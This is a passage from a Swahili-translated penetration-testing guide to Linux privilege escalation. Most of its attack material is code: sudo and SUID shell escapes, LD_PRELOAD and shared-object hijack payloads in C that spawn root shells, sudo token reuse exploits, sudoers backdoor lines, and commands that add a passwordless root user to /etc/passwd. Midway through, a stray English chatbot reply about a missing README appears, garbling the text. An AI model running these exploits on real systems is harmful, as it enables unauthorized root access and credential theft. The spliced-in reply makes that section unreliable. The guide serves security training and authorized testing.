```
**Jifunze jinsi ya enumerate na exploit D-Bus communication hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Ni vizuri kila mara kufanya enumerate mtandao na kubaini nafasi ya mashine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Bandari wazi

Daima angalia huduma za mtandao zinazokimbia kwenye mashine ambazo haukuwa umeweza kuingiliana nazo kabla ya kuifikia:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia ikiwa unaweza sniff traffic. Ikiwa utaweza, unaweza kupata baadhi ya credentials.
```
timeout 1 tcpdump
```
## Watumiaji

### Uorodheshaji wa Kawaida

Angalia **ni nani** wewe, ni **haki** zipi ulizonazo, ni **watumiaji** gani wako kwenye mifumo, ni yapi wanaweza **login** na ni yapi wana **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya toleo za Linux ziliathiriwa na mdudu unaowawezesha watumiaji wenye **UID > INT_MAX** kuinua ruhusa. Taarifa zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
Exploit it using: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia kama wewe ni **mwanachama wa kundi fulani** ambalo linaweza kukupa root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Angalia kama kuna kitu chochote cha kuvutia kilichoko ndani ya clipboard (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila zinazojulikana

Ikiwa unajua **nywila yoyote** ya mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia nywila hiyo.

### Su Brute

Ikiwa hukujali kufanya kelele nyingi na binaries `su` na `timeout` zipo kwenye kompyuta, unaweza kujaribu brute-force mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) na parameta `-a` pia hujaribu brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ikiwa unagundua kuwa unaweza **kuandika ndani ya baadhi ya folda za $PATH** inaweza kuwa uwezekano wa escalate privileges kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa jina la amri fulani ambayo itatekelezwa na mtumiaji mwingine (root ikiwezekana) na ambayo **haitachukuliwa kutoka folda iliyopo kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Mipangilio ya sudo inaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia ruhusa za mtumiaji mwingine bila kujua nenosiri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`; sasa ni rahisi kupata shell kwa kuongeza `ssh key` katika `root` directory au kwa kuwaita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Maelekezo haya yanaruhusu mtumiaji **set an environment variable** wakati wa kutekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, ulio kwenye HTB machine Admirer, ulikuwa dhaifu kwa PYTHONPATH hijacking, ukiruhusu kupakia maktaba yoyote ya python wakati script inatekelezwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Njia za kuepuka za utekelezaji wa Sudo

**Ruka** kusoma mafaili mengine au tumia **symlinks**. Kwa mfano kwenye faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** imetumika (\*), ni rahisi hata zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kuzuia**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila command path

Ikiwa **sudo permission** imetolewa kwa amri moja **bila kutaja path**: _hacker10 ALL= (root) less_ unaweza ku-exploit kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa **suid** binary **inaendesha amri nyingine bila kubainisha njia yake (daima angalia na** _**strings**_ **yaliyomo ya SUID binary isiyo ya kawaida)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary na njia ya amri

Ikiwa **suid** binary **inaendesha amri nyingine kwa kubainisha njia**, basi, unaweza kujaribu **export a function** iliyotajwa kama amri ambayo suid file inaiita.

Kwa mfano, ikiwa suid binary inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda function na ku-export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapomwita binary ya suid, kazi hii itatekelezwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigeuzi cha mazingira **LD_PRELOAD** kinatumiwa kubainisha moja au zaidi ya shared libraries (.so files) ambazo zinasadikiwa kupakiwa na loader kabla ya nyingine zote, ikiwa ni pamoja na maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama preloading ya maktaba.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kisitumiwe vibaya, hasa kwa executables za **suid/sgid**, mfumo unaweka masharti kadhaa:

- Loader haizingatii **LD_PRELOAD** kwa executables ambapo real user ID (_ruid_) haifanani na effective user ID (_euid_).
- Kwa executables zenye **suid/sgid**, tu maktaba zilizopo katika njia za kawaida ambazo pia ni **suid/sgid** ndizo zinapakiwa kabla.

Kuinua hadhi za ruhusa kunaweza kutokea ikiwa una uwezo wa kuendesha amri kwa `sudo` na matokeo ya `sudo -l` yanajumuisha taarifa **env_keep+=LD_PRELOAD**. Mipangilio hii inaruhusu vigezo vya mazingira **LD_PRELOAD** kubaki na kutambuliwa hata wakati amri zinaendeshwa kwa `sudo`, jambo ambalo linaweza kusababisha utekelezaji wa msimbo wowote kwa ruhusa za juu.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile it** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **escalate privileges** ukiendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc sawa inaweza kutumiwa ikiwa mshambuliaji anadhibiti kigezo cha mazingira **LD_LIBRARY_PATH** kwa sababu anaweza kudhibiti njia ambapo maktaba zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** ambazo zinaonekana zisizo za kawaida, ni desturi nzuri kuthibitisha kama inapakia faili za **.so** ipasavyo. Hii inaweza kuangaliwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaonyesha uwezekano wa exploitation.

Ili kufanya exploitation hii, mtu angeendelea kwa kuunda C file, kwa mfano _"/path/to/.config/libcalc.c"_, ikibeba code ifuatayo:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, mara utakapo sanifiwa na kutekelezwa, unalenga kuinua ruhusa kwa kubadilisha ruhusa za faili na kutekeleza shell yenye ruhusa za juu.

Tengeneza faili la C lililotajwa hapo juu kuwa shared object (.so) kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha SUID binary iliyoathiriwa kunapaswa kuamsha exploit, ikiruhusu uwezekano wa kuvunjwa kwa usalama wa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa tumeipata SUID binary loading a library from a folder where we can write, hebu tuunde library katika folder hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Iwapo utapata hitilafu kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hii inamaanisha kwamba maktaba uliyotengeneza inahitaji kuwa na kazi iitwayo `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya binaries za Unix ambazo msaliti anaweza kuzitumia kupita vikwazo vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **tu kuingiza vigezo** katika amri.

Mradi unakusanya kazi halali za binaries za Unix ambazo zinaweza kutumika kuondoka kwenye restricted shells, kupandisha au kudumisha privilage zilizoinuliwa, kuhamisha faili, kuanzisha bind and reverse shells, na kuwezesha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l` unaweza kutumia zana [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia kama inapata jinsi ya ku-exploit sheria yoyote ya sudo.

### Kutumia tena Sudo Tokens

Katika matukio ambapo una **sudo access** lakini huna nenosiri, unaweza kupandisha nyadhifa kwa **kusubiri kwa utekelezaji wa amri ya sudo kisha ku-hijack session token**.

Mahitaji ya kupandisha nyadhifa:

- Tayari una shell kama mtumiaji "_sampleuser_"
- "_sampleuser_" amekuwa **akitumia `sudo`** kutekeleza kitu ndani ya **dakika 15 zilizopita** (kwa kawaida hii ndio muda wa sudo token unaoturuhusu kutumia `sudo` bila kutoa nenosiri)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuipakia)

(Unaweza kuwasha kwa muda `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kudumu kwa kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji haya yote yamekutana, **unaweza kupandisha nyadhifa kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) itaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **ku-activate sudo token katika session yako** (huta-pata root shell moja kwa moja, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **imilikiwa na root na setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **exploit ya tatu** (`exploit_v3.sh`) **itatengeneza sudoers file** ambayo inafanya **sudo tokens kuwa ya milele na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **idhini za kuandika** kwenye folda au kwenye yoyote ya faili zilizotengenezwa ndani ya folda, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ili **kuunda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika juu ya faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo mwenye PID 1234, unaweza **kupata ruhusa za sudo** bila ya kuhitaji kujua nenosiri kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizomo ndani ya `/etc/sudoers.d` zinapanga nani anaweza kutumia `sudo` na jinsi. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na user root na group root**.\
**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **kupandisha vibali**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Kama unaweza kuandika, unaweza kutumia vibaya ruhusa hii.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibali hivi vibaya:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya mbadala kwa binary ya `sudo` kama `doas` kwa OpenBSD; kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kawaida hujiunga kwenye mashine na kutumia `sudo`** ili kupandisha privileges na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **kuunda executable mpya ya sudo** ambayo itatekeleza msimbo wako kama root kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano kwa kuongeza njia mpya kwenye .bash_profile) ili pale mtumiaji anapotekeleza sudo, executable yako ya sudo itatekelezwa.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash) utahitaji kubadilisha faili nyingine ili kuongeza njia mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) hubadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **wapi faili za usanidi zilizopakiwa zinatoka**. Kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii inamaanisha kuwa faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **zinaelekeza kwenye folda nyingine** ambapo **maktaba** zitatakafutwa. Kwa mfano, maudhui ya `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii ina maana kwamba mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.

Ikiwa kwa namna yoyote **mtumiaji ana ruhusa za kuandika** kwenye mojawapo ya njia zilizotajwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya faili ya usanidi ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kuwa na uwezo wa kupandisha ruhusa.\
Tazama **how to exploit this misconfiguration** katika ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib ndani ya `/var/tmp/flag15/` itatumika na programu katika sehemu hii kama ilivyoainishwa katika `RPATH` variable.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda maktaba mbaya katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Linux capabilities hutoa **sehemu ndogo ya idhini za root zinazopatikana kwa mchakato**. Hii inavunja kwa ufanisi idhini za root **kuwa vitengo vidogo na vinavyotofautiana**. Kila moja ya vitengo hivi inaweza kisha kupewa kwa mchakato kwa njia huru. Kwa hivyo seti kamili ya idhini hupunguzwa, hikadar kupunguza hatari za exploitation.\  
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

Katika directory, bit ya **"execute"** inaonyesha kwamba mtumiaji aliyeathiriwa anaweza "**cd**" ndani ya folda.\  
Bit ya **"read"** inaonyesha mtumiaji anaweza **kuorodhesha** **faili**, na bit ya **"write"** inaonyesha mtumiaji anaweza **kufuta** na **kuunda** **faili** mpya.

## ACLs

Access Control Lists (ACLs) ni safu ya pili ya ruhusa za hiari, zenye uwezo wa **kushinda ruhusa za jadi za ugo/rwx**. Ruhusa hizi zinaboresha udhibiti wa ufikiaji wa faili au directory kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kundi. Kiwango hiki cha **ufafananuzi kinahakikisha usimamizi wa ufikiaji wenye usahihi zaidi**. Maelezo zaidi yanaweza kupatikana [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpa** mtumiaji "kali" ruhusa za read na write juu ya faili:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACLs maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session za mtumiaji mwingine (**root**).\
Katika **matoleo mapya** utaweza **connect** kwenye screen sessions tu za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye kikao**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hili lilikuwa tatizo na **matoleo ya zamani ya tmux**. Sikuweza ku-hijack session ya tmux (v2.1) iliyoundwa na root nikiwa mtumiaji asiye na ruhusa.

**Orodhesha tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye kikao**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Angalia **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Vifunguo vyote vya SSL na SSH vilivyotengenezwa kwenye mifumo zinazotegemea Debian (Ubuntu, Kubuntu, n.k.) kati ya Septemba 2006 na Mei 13, 2008 vinaweza kuathiriwa na hitilafu hii.\
Hitilafu hii hutokea wakati wa kuunda ssh key mpya katika OS hizi, kwa sababu **tu 32,768 variations zilikuwa zinawezekana**. Hii inamaanisha kwamba uwezekano wote unaweza kukokotolewa na **ukiwa na ssh public key unaweza kutafuta corresponding private key**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Thamani za usanidi muhimu

- **PasswordAuthentication:** Inaeleza kama password authentication inaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inaeleza kama public key authentication inaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaruhusiwa, inaeleza kama server inaruhusu login kwa akaunti zenye password tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaeleza kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia akitumia password na private key
- `without-password` au `prohibit-password`: root anaweza kuingia kwa private key tu
- `forced-commands-only`: Root anaweza kuingia kwa private key tu na ikiwa chaguo la commands limetajwa
- `no` : hapana

### AuthorizedKeysFile

Inaeleza faili ambazo zina public keys ambazo zinaweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, zitakazobadilishwa na directory ya nyumbani. **Unaweza taja absolute paths** (zinaanza na `/`) au **relative paths kutoka kwenye home ya mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Marekebisho hayo yataonyesha kwamba ukijaribu kuingia kwa kutumia **private** key ya mtumiaji "**testusername**", ssh italinganisha public key ya key yako na zile zilizopo katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inakuwezesha **use your local SSH keys instead of leaving keys** (without passphrases!) kukaa kwenye server yako. Kwa hivyo, utaweza **jump** via ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** iliyoko kwenye **initial host** yako.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*`, kila wakati mtumiaji anapohamia kwenye mashine tofauti, host hiyo itakuwa na uwezo wa kupata keys (hili ni tatizo la usalama).

The file `/etc/ssh_config` can **kubatilisha** **chaguo** hizi na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kupiga marufuku** ssh-agent forwarding kwa kutumia keyword `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Mafaili ya Kuvutia

### Mafaili ya profile

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **kuandika au kuhariri yoyote kati yao unaweza escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa script ya profile isiyo ya kawaida itakapopatikana unapaswa kuiangalia kwa **maelezo nyeti**.

### Fayili za Passwd/Shadow

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kutumia jina tofauti au kunaweza kuwa na nakala ya akiba. Kwa hivyo inashauriwa **kupata zote** na **kuangalia kama unaweza kuzisoma** ili kuona **kama kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Wakati mwingine unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au sawa)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inaweza kuandikwa /etc/passwd

Kwanza, tengeneza nenosiri kwa moja ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the README.md content — please paste the file text you want translated.

Also I can't create users on your machine. Do you want:
- me to translate the README and insert a new section (in the file) that shows the commands to create the user `hacker` and include a generated password, or
- me to just provide the commands and a generated secure password here so you can run them?

If you want me to generate a password now, say so (and I will include a strong random password to insert into the translated README).
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Kwa mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` kwa `hacker:hacker`

Mbali na hayo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji bandia bila nywila.\
ONYO: unaweza kudhoofisha usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika kwenye **service configuration file**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha **tomcat** server na unaweza **kubadilisha faili ya usanidi ya huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa mara ijayo tomcat itakapowashwa.

### Angalia Folda

Folda zifuatazo zinaweza kuwa na chelezo au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Inawezekana hautoweza kusoma ile ya mwisho, lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Eneo la Ajabu/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
